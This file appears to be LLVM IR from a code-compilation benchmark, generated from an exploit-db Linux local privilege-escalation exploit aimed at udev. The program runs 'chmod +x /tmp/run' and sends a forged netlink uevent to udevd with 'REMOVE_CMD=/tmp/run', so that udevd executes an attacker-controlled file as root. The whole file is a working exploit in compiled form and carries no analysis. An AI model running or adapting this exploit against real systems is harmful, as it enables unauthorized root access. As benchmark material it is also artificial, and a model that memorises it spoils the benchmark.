; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_8572.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_8572.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }
%struct.msghdr = type { i32, i32, %struct.iovec*, i8* }
%struct.iovec = type { i32, i8* }
%struct.sockaddr_nl = type { i64, i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [42 x i8] c"Pass the udevd netlink PID as an argument\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"[-] Error: %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"/etc/udev/rules.d/95-udev-late.rules\00", align 1
@.str.3 = private unnamed_addr constant [37 x i8] c"/lib/udev/rules.d/95-udev-late.rules\00", align 1
@.str.4 = private unnamed_addr constant [38 x i8] c"Required 95-udev-late.rules not found\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"/tmp/run\00", align 1
@.str.6 = private unnamed_addr constant [42 x i8] c"/tmp/run does not exist, please create it\00", align 1
@.str.7 = private unnamed_addr constant [18 x i8] c"chmod +x /tmp/run\00", align 1
@AF_NETLINK = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@NETLINK_KOBJECT_UEVENT = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [10 x i8] c"remove@/d\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"SUBSYSTEM=block\00", align 1
@.str.10 = private unnamed_addr constant [17 x i8] c"DEVPATH=/dev/foo\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"TIMEOUT=10\00", align 1
@.str.12 = private unnamed_addr constant [14 x i8] c"ACTION=remove\00", align 1
@.str.13 = private unnamed_addr constant [20 x i8] c"REMOVE_CMD=/tmp/run\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [4096 x i8], align 16
  %10 = alloca %struct.stat, align 4
  %11 = alloca %struct.msghdr, align 8
  %12 = alloca %struct.iovec, align 8
  %13 = alloca %struct.sockaddr_nl, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %20

16:                                               ; preds = %2
  store i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str, i64 0, i64 0), i8** %8, align 8
  %17 = load i8*, i8** %8, align 8
  %18 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i8* %17)
  %19 = call i32 @exit(i32 1) #3
  unreachable

20:                                               ; preds = %2
  %21 = call i32 @stat(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0), %struct.stat* %10)
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %30

23:                                               ; preds = %20
  %24 = call i32 @stat(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0), %struct.stat* %10)
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %26, label %30

26:                                               ; preds = %23
  store i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.4, i64 0, i64 0), i8** %8, align 8
  %27 = load i8*, i8** %8, align 8
  %28 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i8* %27)
  %29 = call i32 @exit(i32 1) #3
  unreachable

30:                                               ; preds = %23, %20
  %31 = call i32 @stat(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), %struct.stat* %10)
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %33, label %37

33:                                               ; preds = %30
  store i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.6, i64 0, i64 0), i8** %8, align 8
  %34 = load i8*, i8** %8, align 8
  %35 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i8* %34)
  %36 = call i32 @exit(i32 1) #3
  unreachable

37:                                               ; preds = %30
  %38 = call i32 @system(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.7, i64 0, i64 0))
  %39 = call i32 @memset(%struct.sockaddr_nl* %13, i32 0, i32 16)
  %40 = load i32, i32* @AF_NETLINK, align 4
  %41 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %13, i32 0, i32 2
  store i32 %40, i32* %41, align 4
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @atoi(i8* %44)
  %46 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %13, i32 0, i32 1
  store i32 %45, i32* %46, align 8
  %47 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %13, i32 0, i32 0
  store i64 0, i64* %47, align 8
  %48 = bitcast %struct.sockaddr_nl* %13 to i8*
  %49 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %11, i32 0, i32 3
  store i8* %48, i8** %49, align 8
  %50 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %11, i32 0, i32 0
  store i32 16, i32* %50, align 8
  %51 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %11, i32 0, i32 2
  store %struct.iovec* %12, %struct.iovec** %51, align 8
  %52 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %11, i32 0, i32 1
  store i32 1, i32* %52, align 4
  %53 = load i32, i32* @AF_NETLINK, align 4
  %54 = load i32, i32* @SOCK_DGRAM, align 4
  %55 = load i32, i32* @NETLINK_KOBJECT_UEVENT, align 4
  %56 = call i32 @socket(i32 %53, i32 %54, i32 %55)
  store i32 %56, i32* %6, align 4
  %57 = load i32, i32* %6, align 4
  %58 = bitcast %struct.sockaddr_nl* %13 to %struct.sockaddr*
  %59 = call i32 @bind(i32 %57, %struct.sockaddr* %58, i32 16)
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  store i8* %60, i8** %7, align 8
  %61 = load i8*, i8** %7, align 8
  %62 = call i64 @sprintf(i8* %61, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  %63 = add nsw i64 %62, 1
  %64 = load i8*, i8** %7, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 %63
  store i8* %65, i8** %7, align 8
  %66 = load i8*, i8** %7, align 8
  %67 = call i64 @sprintf(i8* %66, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0))
  %68 = add nsw i64 %67, 1
  %69 = load i8*, i8** %7, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 %68
  store i8* %70, i8** %7, align 8
  %71 = load i8*, i8** %7, align 8
  %72 = call i64 @sprintf(i8* %71, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.10, i64 0, i64 0))
  %73 = add nsw i64 %72, 1
  %74 = load i8*, i8** %7, align 8
  %75 = getelementptr inbounds i8, i8* %74, i64 %73
  store i8* %75, i8** %7, align 8
  %76 = load i8*, i8** %7, align 8
  %77 = call i64 @sprintf(i8* %76, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i64 0, i64 0))
  %78 = add nsw i64 %77, 1
  %79 = load i8*, i8** %7, align 8
  %80 = getelementptr inbounds i8, i8* %79, i64 %78
  store i8* %80, i8** %7, align 8
  %81 = load i8*, i8** %7, align 8
  %82 = call i64 @sprintf(i8* %81, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.12, i64 0, i64 0))
  %83 = add nsw i64 %82, 1
  %84 = load i8*, i8** %7, align 8
  %85 = getelementptr inbounds i8, i8* %84, i64 %83
  store i8* %85, i8** %7, align 8
  %86 = load i8*, i8** %7, align 8
  %87 = call i64 @sprintf(i8* %86, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.13, i64 0, i64 0))
  %88 = add nsw i64 %87, 1
  %89 = load i8*, i8** %7, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 %88
  store i8* %90, i8** %7, align 8
  %91 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %92 = getelementptr inbounds %struct.iovec, %struct.iovec* %12, i32 0, i32 1
  store i8* %91, i8** %92, align 8
  %93 = load i8*, i8** %7, align 8
  %94 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %95 = ptrtoint i8* %93 to i64
  %96 = ptrtoint i8* %94 to i64
  %97 = sub i64 %95, %96
  %98 = trunc i64 %97 to i32
  %99 = getelementptr inbounds %struct.iovec, %struct.iovec* %12, i32 0, i32 0
  store i32 %98, i32* %99, align 8
  %100 = load i32, i32* %6, align 4
  %101 = call i32 @sendmsg(i32 %100, %struct.msghdr* %11, i32 0)
  %102 = load i32, i32* %6, align 4
  %103 = call i32 @close(i32 %102)
  ret i32 0
}

declare dso_local i32 @printf(i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @memset(%struct.sockaddr_nl*, i32, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @sprintf(i8*, i8*) #1

declare dso_local i32 @sendmsg(i32, %struct.msghdr*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
